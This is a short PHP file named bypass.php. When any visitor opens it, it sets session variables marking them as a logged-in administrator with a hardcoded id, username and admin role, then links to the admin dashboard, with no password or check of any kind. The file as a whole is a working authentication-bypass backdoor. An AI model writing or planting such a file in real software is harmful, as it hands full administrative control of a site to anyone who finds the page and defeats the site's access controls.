<?php
// File: bypass.php
session_start();
$_SESSION['admin_logged_in'] = true;
$_SESSION['admin_id'] = 1;
$_SESSION['admin_username'] = 'shanisbsg';
$_SESSION['admin_role'] = 'admin';
echo 'Session set. <a href="admin-dashboard.php">Go to Dashboard</a>';
?>
